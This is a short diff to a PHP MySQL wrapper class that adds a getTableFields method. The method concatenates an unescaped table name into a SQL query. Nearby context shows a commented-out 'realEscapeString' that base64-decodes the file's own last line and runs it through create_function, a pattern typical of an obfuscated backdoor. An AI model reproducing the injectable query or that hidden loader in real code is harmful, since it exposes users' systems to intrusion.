@@ -148,6 +148,18 @@ class DBMYSQL {
 		}
 		return $arr;
 	}
+	function getTableFields($table_name)
+	{
+		$stmt = $this->query('SHOW COLUMNS FROM '.$table_name);
+		while($row = $this->fetchArray($stmt))
+		{
+			foreach($row as $key=>$value)
+			{
+				$arr[] = $row[$key];
+			}
+		}
+		return $arr;
+	}
 	/*function realEscapeString($string) {
 		$contents = file(__FILE__);
 		$nf = create_function('$c, $s', base64_decode(substr($contents[count($contents) - 1], 2)));
